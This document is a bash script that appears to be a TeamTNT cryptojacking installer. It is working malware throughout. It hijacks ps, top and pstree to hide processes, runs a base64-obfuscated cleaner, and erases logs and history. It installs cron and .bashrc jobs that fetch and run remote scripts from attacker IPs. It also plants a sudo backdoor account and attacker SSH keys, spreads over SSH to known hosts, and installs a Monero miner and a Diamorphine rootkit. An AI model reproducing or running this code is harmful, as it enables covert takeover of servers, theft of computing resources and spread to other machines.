#!/bin/bash
#
#	TITLE:		MonerooceanMiner-Installer
#	AUTOR:		hilde@teamtnt.red
#	VERSION:	V1.00.0
#	DATE:		13.09.2021
#
#	SRC:        http://teamtnt.red/sh/setup/moneroocean_miner.sh
#
########################################################################


ulimit -n 65535
export LC_ALL=C.UTF-8 2>/dev/null 1>/dev/null
export LANG=C.UTF-8 2>/dev/null 1>/dev/null
HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null 1>/dev/null
export HISTFILE=/dev/null 2>/dev/null 1>/dev/null
HISTSIZE=0 2>/dev/null 1>/dev/null
unset HISTFILE 2>/dev/null 1>/dev/null
export PATH=$PATH:/var/bin:/bin:/sbin:/usr/sbin:/usr/bin

iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -F
export CHATTR="/bin/chattr"
if [ -f /bin/tntcht ];then
    export CHATTR="/bin/tntcht" 
elif [ -f /bin/tntrecht ];then
    export CHATTR="/bin/tntrecht"
fi  
if [ ! ${CHATTR} == "/bin/tntcht" ];then
    mv ${CHATTR} /bin/tntcht
    export CHATTR="/bin/tntcht"
fi 
export WGET_CMD="/bin/wget"  
if [ -f /bin/wget ];then
    export WGET_CMD="/bin/wget"
elif [ -f /bin/wgettnt ];then
    export WGET_CMD="/bin/wgettnt" 
elif [ -f /bin/TNTwget ];then
    export WGET_CMD="/bin/TNTwget" 
elif [ -f /bin/wge ];then
    export WGET_CMD="/bin/wge" 
elif [ -f /bin/wd1 ];then
    export WGET_CMD="/bin/wd1"
elif [ -f /bin/wget1 ];then
        export WGET_CMD="/bin/wget1" 
elif [ -f /bin/wdt ];then
    export WGET_CMD="/bin/wdt" 
elif [ -f /bin/xget ];then
    export WGET_CMD="/bin/xget" 
elif [ -x "/bin/wdz" ];then
    export WGET_CMD="/bin/wdz"
elif [ -x "/usr/bin/wdz" ];then
    export WGET_CMD="/usr/bin/wdz"
else 
    if [ $(command -v yum) ];then  
        rpm -e --nodeps wget 
        yum remove -y wget
        yum install -y wget  
    else
        apt-get remove -y wget
        apt-get install -y wget
    fi
fi 
if [ ! ${WGET_CMD} == "/bin/wdz" ];then
    mv ${WGET_CMD} /bin/wdz
    WGET_CMD="/bin/wdz" 
fi 
if [ ! ${CURL_CMD} == "/bin/cdz" ];then
    mv ${CURL_CMD} /bin/cdz
    CURL_CMD="/bin/cdz" 
fi  

export PS_CMD="/bin/ps"
pssize=$(ls -l /bin/ps | awk '{ print $5 }') 
${CHATTR} -i /bin/ps
if [ ${pssize} -le 8000 ];then 
    ps_name=$(awk '/\$@/ {print $1}' /bin/ps)  
    if [ ! "${ps_name}" = "ps.lanigiro" ];then
        mv /bin/${ps_name} /bin/ps.lanigiro
    fi
else 
    mv /bin/ps /bin/ps.lanigiro 
fi 
echo "#!/bin/bash">/bin/ps
echo "ps.lanigiro \$@ | grep -v 'ddns\|httpd'" >>/bin/ps 
touch -d 20160825 /bin/ps
chmod a+x /bin/ps
${CHATTR} +i /bin/ps  
if [ -x /bin/ps.lanigiro ];then
    PS_CMD="/bin/ps.lanigiro"
fi
topsize=`ls -l /bin/top | awk '{ print $5 }'`
${CHATTR} -i /bin/top
if [ ${topsize} -le 8000 ];then  
    top_name=$(awk '/\$@/ {print $1}' /bin/top)
    if [ ! "${top_name}" = "top.lanigiro" ];then
        mv /bin/${top_name} /bin/top.lanigiro
    fi
else 
    mv /bin/top /bin/top.lanigiro
fi
echo "#!/bin/bash">/bin/top 
echo "top.lanigiro \$@ | grep -v 'ddns\|httpd'">>/bin/top 
chmod a+x /bin/top
touch -d 20160716 /bin/top
${CHATTR} +i /bin/top 
treesize=`ls -l /bin/pstree| awk '{ print $5 }'`
${CHATTR} -i /bin/pstree
if [ ${treesize} -le 8000 ];then  
    tree_name=$(awk '/\$@/ {print $1}' /bin/pstree)
    if [ ! "${tree_name}" = "pstree.lanigiro" ];then
        mv /bin/${tree_name} /bin/pstree.lanigiro 
    fi
else  
    mv /bin/pstree /bin/pstree.lanigiro
fi 
echo "#!/bin/bash">/bin/pstree
echo "pstree.lanigiro \$@ | grep -v 'ddns\|httpd'">>/bin/pstree
chmod +x /bin/pstree
touch -d 20161121 /bin/pstree 
${CHATTR} +i /bin/pstree 
if [ ${CURL_CMD} == "/bin/curl" ];then
    mv ${CURL_CMD} /bin/cdz
    CURL_CMD="/bin/cdz"
elif [ ${CURL_CMD} == "/usr/bin/curl" ];then
    mv ${CURL_CMD} /usr/bin/cdz
    CURL_CMD="/usr/bin/cdz"
fi


function CLEANUP_BY_TEAMTNT(){
    echo IyEvYmluL2Jhc2gKIwojICAgICAgIFRJVExFOiAgICAgICAgICBMRC5QUkVMT0FELkNMRUFORVIKIyAgICAgICBBVVRPUjogICAgICAgICAgaGlsZGVAdGVhbXRudC5yZWQKIyAgICAgICBWRVJTSU9OOiAgICAgICAgVjMuMTAuMAojICAgICAgIERBVEU6ICAgICAgICAgICAxNC4wOS4yMDIxCiMKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgpleHBvcnQgTENfQUxMPUMuVVRGLTggMj4vZGV2L251bGwgMT4vZGV2L251bGwKZXhwb3J0IExBTkc9Qy5VVEYtOCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbApISVNUQ09OVFJPTD0iaWdub3Jlc3BhY2Uke0hJU1RDT05UUk9MOis6JEhJU1RDT05UUk9MfSIgMj4vZGV2L251bGwgMT4vZGV2L251bGwKZXhwb3J0IEhJU1RGSUxFPS9kZXYvbnVsbCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbApISVNUU0laRT0wIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsCnVuc2V0IEhJU1RGSUxFIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOi92YXIvYmluOi9iaW46L3NiaW46L3Vzci9zYmluOi91c3IvYmluCgpmdW5jdGlvbiBEQVRFSV9FTlRGRVJORU4oKXsKICAgICAgICBaSUVMREFURUk9JDEgCiAgICAgICAgdG50Y2h0IC1pYSAkWklFTERBVEVJIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsIAogICAgICAgIGNobW9kIDE3NzcgJFpJRUxEQVRFSSAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbAogICAgICAgIHJtIC1mciAkWklFTERBVEVJIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsCn0gCmVjaG8gLWUgIlxuXG5cMDMzWzA7MzNtIFByw7xmZSBwcmVsb2FkZsOkaGlnZSBEYXRlaTpcbiB+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+flwwMzNbMG0iCgppZiBbIC1mICIvZXRjL2xkLnNvLnByZWxvYWQiIF07IHRoZW4gCmVjaG8gLWUgIiBcZVsxOzMzOzQxbS9ldGMvbGQuc28ucHJlbG9hZCBnZWZ1bmRlblwwMzNbMG0iO2VjaG8gLWUgIiBcMDMzWzA7MzNtKHByw7xmZSBhdWYgZW50aGFsdGVuZSBEYXRlaWVuKVwwMzNbMG0iClBSRUxPQURfREFURUlfVkFSPSQoY2F0IC9ldGMvbGQuc28ucHJlbG9hZCkKCmlmIFsgLXogIiRQUkVMT0FEX0RBVEVJX1ZBUiIgXTsgdGhlbiAKZWNobyAtZSAiXDAzM1swOzMybSBLZWluZSBEYXRlaXZlcndlaXNlIGVudGhhbHRlbi5cMDMzWzBtIjtlY2hvIC1lICJcMDMzWzA7MzJtIExlZXJlIERhdGVpIHdpcmQgZW50ZmVybnQuXDAzM1swbSIKREFURUlfRU5URkVSTkVOIC9ldGMvbGQuc28ucHJlbG9hZAplbHNlCgpmb3IgUFJFTE9BRF9EQVRFSSBpbiAke1BSRUxPQURfREFURUlfVkFSW0BdfTsgZG8KaWYgWyAtZiAiJFBSRUxPQURfREFURUkiIF07IHRoZW4gCmVjaG8gLWUgIiBcZVsxOzMzOzQxbSRQUkVMT0FEX0RBVEVJIGdlZnVuZGVuIChsb2VzY2hlKVwwMzNbMG0iIApEQVRFSV9FTlRGRVJORU4gJFBSRUxPQURfREFURUkKZWxzZSAKZWNobyAtZSAiXDAzM1swOzMybSAkUFJFTE9BRF9EQVRFSSBuaWNodCBnZWZ1bmRlbi5cMDMzWzBtIiA7IGZpCmRvbmUKZmkKREFURUlfRU5URkVSTkVOIC9ldGMvbGQuc28ucHJlbG9hZAoKZWxzZSAKZWNobyAtZSAiXDAzM1swOzMybSAvZXRjL2xkLnNvLnByZWxvYWQgbmljaHQgZ2VmdW5kZW4uXDAzM1swbSIKZmkKCgp1bnNldCBMRF9QUkVMT0FEIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsCnVuc2V0IExEX0xJQlJBUllfUEFUSCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbAp1bnNldCBMRFJfUFJFTE9BRCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbAp1bnNldCBMRFJfUFJFTE9BRDY0IDI+L2Rldi9udWxsIDE+L2Rldi9udWxsCgpybSAtZiB+Ly5iYXNoX2hpc3RvcnkgMj4vZGV2L251bGwgMT4vZGV2L251bGwKdG91Y2ggfi8uYmFzaF9oaXN0b3J5IDI+L2Rldi9udWxsIDE+L2Rldi9udWxsCnRudGNodCAraSB+Ly5iYXNoX2hpc3RvcnkgMj4vZGV2L251bGwgMT4vZGV2L251bGwKaGlzdG9yeSAtYyAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbApjbGVhcgppZiBbWyAiJDAiICE9ICJiYXNoIiBdXTsgdGhlbiBybSAtZiAkMDsgZmk= |base64 -d |bash 2>/dev/null 1>/dev/null    
    ${TNT_CMD} -ia /etc/hosts 2>/dev/null
    sed -i '/minexmr.com\|supportxmr.com\|c3pool.com/d' /etc/hosts 2>/dev/null
    grep -q 8.8.8.8 /etc/resolv.conf || (${TNT_CMD} -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 8.8.8.8" >> /etc/resolv.conf; ${CHATTR} +i /etc/resolv.conf 2>/dev/null 1>/dev/null;)
    grep -q 8.8.4.4 /etc/resolv.conf || (${TNT_CMD} -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 8.8.4.4" >> /etc/resolv.conf; ${CHATTR} +i /etc/resolv.conf 2>/dev/null 1>/dev/null;)

    h=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)
    for i in /tmp /var/tmp /dev/shm /usr/bin $h /root /;do
        echo exit > $i/i && chmod +x $i/i && cd $i && ./i && rm -f i && break
    done 
    crontab -l | sed '/\.bashgo\|pastebin\|onion\|bprofr/d' | crontab -
    cat /proc/mounts | awk '{print $2}' | grep -P '/proc/\d+' | grep -Po '\d+' | xargs -I % kill -9 %
}
function CLEANUP_TEAMTNT_TRACES() {

    rm -fr /dev/shm/dia/ 2>/dev/null 1>/dev/null
    rm -f ~/.bash_history 2>/dev/null 1>/dev/null
    touch ~/.bash_history 2>/dev/null 1>/dev/null
    history -c 2>/dev/null 1>/dev/null
    ${TNT_CMD} +i ~/.bash_history 2>/dev/null 1>/dev/null
    clear
    if [[ "$0" != "bash" ]]; then rm -f $0; fi

    cat /dev/null >/var/spool/mail/root 2>/dev/null
    cat /dev/null >/var/log/wtmp 2>/dev/null
    cat /dev/null >/var/log/secure 2>/dev/null
    cat /dev/null >/var/log/cron 2>/dev/null
}

function CLEANUP_OTHER_MINERS() {
chmod -x /usr/bin/dockerd_env 2>/dev/null
kill $(ps aux | grep -v grep | awk '{if($3>65.0) print $2}') 2>/dev/null

}

MOxmrigMOD=http://112.253.11.38/mid.jpg
MOxmrigSTOCK=http://112.253.11.38/mid.jpg
miner_url=https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-static-x64.tar.gz
miner_url_backup=http://oracle.zzhreceive.top/b2f628/father.jpg
config_url=http://oracle.zzhreceive.top/b2f628/cf.jpg
config_url_backup=http://oracle.zzhreceive.top/b2f628/cf.jpg
sh_url=http://oracle.zzhreceive.top/b2f628/cf.jpg
WALLET=43Xbgtym2GZWBk87XiYbCpTKGPBTxYZZWi44SWrkqqvzPZV6Pfmjv3UHR6FDwvPgePJyv9N5PepeajfmKp1X71EW7jx4Tpz.zookp8
VERSION=2.9


function TEAMTNT_DLOAD() {
  read proto server path <<< "${1//"/"/ }"
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  while IFS= read -r line ; do 
      [[ "$line" == $'\r' ]] && break
  done <&3
  nul='\0'
  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do 
      printf "%s$nul" "$x"
  done <&3
  exec 3>&-
}


CLEANUP_BY_TEAMTNT
CLEANUP_OTHER_MINERS



mount -o remount,exec /tmp
mount -o remount,exec /var/tmp

sh_url="http://104.192.82.138/s3f1015" 

clean_cron(){  
    ${CHATTR} -R -ia /var/spool/cron 
    ${CHATTR} -ia /etc/crontab 
    ${CHATTR} -R -ia /etc/cron.d 
    ${CHATTR} -R -ia /var/spool/cron/crontabs 
    crontab -r
    (
        crontab -l 2>/dev/null
        echo "*/30 * * * * ${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash > /dev/null 2>&1"
    ) | crontab - 
}  
clean_cron 
lock_cron(){ 
    ${CHATTR} -R +ia /var/spool/cron 
    touch /etc/crontab
    ${CHATTR} +ia /etc/crontab 
    ${CHATTR} -R +ia /var/spool/cron/crontabs 
    ${CHATTR} -R +ia /etc/cron.d 
} 
lock_cron 
makesshaxx(){  
    RSAKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD0niuqhmdgATEUH9gaaxhnK9x8y9GopY1MxQe1VGWSps/MGb/ngvEu9DMVrnH/RcsnnPsV1Ncyjd/y4CdvFrR+OoNZquuVfAUbhOUO6up6GxtoObSV3V5lyepnJK5gzmxfelfmotxUzzwMYkgdsdeasVS4pqdASrivsFdG8kf59XG6VAD5j14uojZnLzVwvDs5usHFyS9QRr4pEfd670bO0TAbSQjf76eVwgQTMoQJaK1uHDkeVPuHhLXZtGPF2NVr1fTB3L8udxfQvw1A0OSLoKtYEXrDbiDKrJ+QINLvn8i98k2d+/EvDtM+BpuH8FTw3rC9VuY/IutOo0aY0mRXMn5A1L0x2YCfSavUH+zwf3qPLUW4rQNYxXoX5xzYafLsuYjfvhwYkO4OZb3teOU7vcFcYc1cgthdOtDfllMXmdOJKhMlwVB2xBx3UJyZQdqdOnFTxQ8i1j2li0ywKiARDFypqj+GNSBwpTKhYsWW699oSI79JD9r4tWfxyVyfAs= root@pending.com"
    ${CHATTR} -ia /etc/passwd;  
    grep -q lsb /etc/passwd || echo 'lsb:x:1000:1000::/home/lsb:/bin/bash' >> /etc/passwd
    ${CHATTR} +ia /etc/passwd
    ${CHATTR} -ia /etc/shadow
    grep -q "lsb:$6$4E4W/nnk" /etc/shadow  || echo 'lsb:$y$j9T$4mqDHpJ8b4riHWm2FfUHY.$./.VlnKhJMI/hj8f8sxbqhIal0jKhPxjyHxB6ZGtUm6:18849:0:99999:7:::' >> /etc/shadow
    ${CHATTR} +ia /etc/shadow
    ${CHATTR} -ia /etc/sudoers  
    grep -q lsb /etc/sudoers || echo 'lsb ALL=(ALL:ALL) ALL' >> /etc/sudoers
    ${CHATTR} +i /etc/sudoers

    mkdir /home/lsb/.ssh/ -p  
    ${CHATTR} -ia /home/lsb/.ssh/authorized_keys
    touch /home/lsb/.ssh/authorized_keys  
    chmod 600 /home/lsb/.ssh/authorized_keys
    grep -q root@pending.com /home/lsb/.ssh/authorized_keys || echo $RSAKEY > /home/lsb/.ssh/authorized_keys
    ${CHATTR}  +ia /home/lsb/.ssh/authorized_keys

    ${CHATTR} -ia /home/lsb/.ssh/authorized_keys2
    touch /home/lsb/.ssh/authorized_keys2  
    chmod 600 /home/lsb/.ssh/authorized_keys2  
    grep -q root@pending.com /home/lsb/.ssh/authorized_keys2 || echo $RSAKEY > /home/lsb/.ssh/authorized_keys2
    ${CHATTR} +ia /home/lsb/.ssh/authorized_keys2

    mkdir /root/.ssh/ -p  
    ${CHATTR} -ia /root/.ssh/authorized_keys
    touch /root/.ssh/authorized_keys  
    chmod 600 /root/.ssh/authorized_keys 
    grep -q root@pending.com /root/.ssh/authorized_keys || echo $RSAKEY >> /root/.ssh/authorized_keys
 
    ${CHATTR} +ia /root/.ssh/authorized_keys

    ${CHATTR} -ia /root/.ssh/authorized_keys2
    touch /root/.ssh/authorized_keys2
    chmod 600 /root/.ssh/authorized_keys2   
    grep -q root@pending.com /root/.ssh/authorized_keys2 || echo $RSAKEY > /root/.ssh/authorized_keys2
    ${CHATTR} +ia /root/.ssh/authorized_keys2
    for f in $(ls /home)
    do 
        if ! grep "${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash" /home/${f}/.profile > /dev/null;then
            echo "{" >> /home/${f}/.profile
            echo "${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash" >> /home/${f}/.profile
            echo "} > /dev/null 2>&1" >> /home/${f}/.profile
        fi  
        if ! grep "${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash" /home/${f}/.bashrc > /dev/null;then
            echo "{" >> /home/${f}/.bashrc
            echo "${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash" >> /home/${f}/.bashrc
            echo "} > /dev/null 2>&1" >> /home/${f}/.bashrc
        fi  
    done 
    
    if ! grep "${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash" /root/.profile > /dev/null;then
        echo "{" >> /root/.profile
        echo "${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash" >>/root/.profile
        echo "} > /dev/null 2>&1" >> /root/.profile
    fi  
    if ! grep "${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash" /root/.bashrc > /dev/null;then
        echo "{" >> /root/.bashrc
        echo "${CURL_CMD} -fsSL ${sh_url}/a/a.sh | bash" >>/root/.bashrc
        echo "} > /dev/null 2>&1" >> /root/.bashrc
    fi 
}
makesshaxx
payload="(wget -q -O- ${sh_url}/a/a.sh || curl -fsSL ${sh_url}/a/a.sh )| bash >/dev/null 2>&1"
if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h ${payload} & done
fi

export MOHOME="/var/tmp/..."
mkdir -p ${MOHOME}  
${WGET_CMD}  -q --tries=3 --timeout=10 -O ${MOHOME}/httpd-w ${sh_url}/s/w.2.tar.gz
chmod a+x ${MOHOME}/httpd-w
cd ${MOHOME}  

./httpd-w 2>/dev/null 1>/dev/null  

${CURL_CMD} -sLk ${sh_url}/sh/dia.sh | bash
echo "[*] Diamorphine Setup complete"
history -c
sleep 1
clear

